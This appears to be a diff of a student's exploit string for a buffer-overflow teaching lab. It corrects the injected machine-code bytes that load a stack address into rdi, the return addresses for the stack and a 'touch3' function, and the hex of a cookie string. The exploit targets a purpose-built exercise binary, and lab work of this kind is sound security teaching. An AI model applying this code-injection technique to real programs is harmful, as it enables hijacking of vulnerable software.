@@ -1,7 +1,6 @@
-48 c7 07 5c 7b 64 55 c3 /* move stack to rdi */
-00 00 00 00 00 00 00 00
+48 c7 c7 68 7b 64 55 c3 /* move stack to rdi */
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 40 7b 64 55 00 00 00 00 /* address of stack */
 1a 2b 40 00 00 00 00 00 /* address of touch3 */
-33 51 66 30 35 30 36 36 /* hex of cookie */
+33 61 66 30 35 30 36 36 /* hex of cookie */
